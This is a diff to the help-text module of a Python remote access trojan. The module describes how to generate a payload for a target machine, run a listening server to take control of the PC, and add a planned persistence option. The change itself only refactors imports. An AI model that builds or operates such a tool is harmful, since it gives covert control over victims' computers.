@@ -1,4 +1,4 @@
-from .output import output
+from common.output import *
 
 GREETINGS_MESSAGE = """"
 1 Generate payload (generate)
@@ -7,26 +7,26 @@ GREETINGS_MESSAGE = """"
 
 HELP_OVERALL = f"""
 Welcome to the RAT. Steps to gain control over a PC.
-1. Create payload using {output.make_blue("command")}
+1. Create payload using {make_blue("command")}
 2. Launch the payload (
 
-Usage: {output.make_bold("python main.py ")} {output.make_blue("command")} {output.make_yellow("--help")}
-These are {output.make_blue("commands")} available for usage:
+Usage: {make_bold("python main.py ")} {make_blue("command")} {make_yellow("--help")}
+These are {make_blue("commands")} available for usage:
 
-    {output.make_green("bind")}        Run the Server on machine and establish connections
-    {output.make_green("generate")}    Generate the Payload file for target platform
+    {make_green("bind")}        Run the Server on machine and establish connections
+    {make_green("generate")}    Generate the Payload file for target platform
 
-{output.make_bold("IP ADDRESS AND PORT IN BOTH COMMANDS SHOULD BE THE SAME")}
+{make_bold("IP ADDRESS AND PORT IN BOTH COMMANDS SHOULD BE THE SAME")}
 
-You can further get help on available commands by supplying {output.make_yellow("--help")} argument.
-For example: {output.make_bold("python main.py generate --help")}
+You can further get help on available commands by supplying {make_yellow("--help")} argument.
+For example: {make_bold("python main.py generate --help")}
 """
 
 HELP_BIND = f"""
 
 Launches server and binds it to provided IP address and port
 
-Usage: {output.make_bold("python main.py ")} {output.make_blue("bind")} {output.make_yellow("--address X.X.X.X")} {output.make_yellow("--port X")} 
+Usage: {make_bold("python main.py ")} {make_blue("bind")} {make_yellow("--address X.X.X.X")} {make_yellow("--port X")} 
 
     Args              Description
     -h, --help        Show Help for Bind command
@@ -35,19 +35,19 @@ Usage: {output.make_bold("python main.py ")} {output.make_blue("bind")} {output.
 """
 
 HELP_GENERATE = f"""
-{output.make_bold("GENERATE")} 
+{make_bold("GENERATE")} 
 Generates the required payload file to be executed on client side. 
-The compiled version {output.make_bold("has to generated on the respective platform.")}  
+The compiled version {make_bold("has to generated on the respective platform.")}  
 For example, you can't generate an .exe file on Linux. You specifically have to be on Windows.
 
-Usage: {output.make_bold("python main.py ")} {output.make_blue("generate")} {output.make_yellow("--address X.X.X.X")} {output.make_yellow("--port X")} {output.make_yellow("--output filename")} 
+Usage: {make_bold("python main.py ")} {make_blue("generate")} {make_yellow("--address X.X.X.X")} {make_yellow("--port X")} {make_yellow("--output filename")} 
 
     Args                                  Description
     
-    {output.make_yellow("--help")}        Show Help Manual for generate command
-    {output.make_yellow("--address")}     IP Address of server. [Connect to]
-    {output.make_yellow("--port")}        Port of connecting server
-    {output.make_yellow("--output")}      Output file to generate
-    {output.make_yellow("--source")}      Do not generate compiled code (generates Python source file)
-    {output.make_yellow("--persistence")} Auto start on reboot [Under Development]
+    {make_yellow("--help")}        Show Help Manual for generate command
+    {make_yellow("--address")}     IP Address of server. [Connect to]
+    {make_yellow("--port")}        Port of connecting server
+    {make_yellow("--output")}      Output file to generate
+    {make_yellow("--source")}      Do not generate compiled code (generates Python source file)
+    {make_yellow("--persistence")} Auto start on reboot [Under Development]
 """
